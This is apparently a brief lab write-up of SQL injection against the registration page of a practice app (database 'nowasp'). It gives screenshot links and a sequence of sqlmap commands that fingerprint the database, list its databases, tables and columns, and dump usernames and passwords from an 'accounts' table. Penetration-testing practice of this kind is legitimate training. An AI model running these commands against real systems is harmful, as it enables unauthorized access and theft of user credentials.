#### Register

- Demo

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

- Commands

```sh
python sqlmap.py -r req.txt --threads=10 -f
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL --dbs
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp --tables
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts --columns
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts --dump
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts -C username,password
```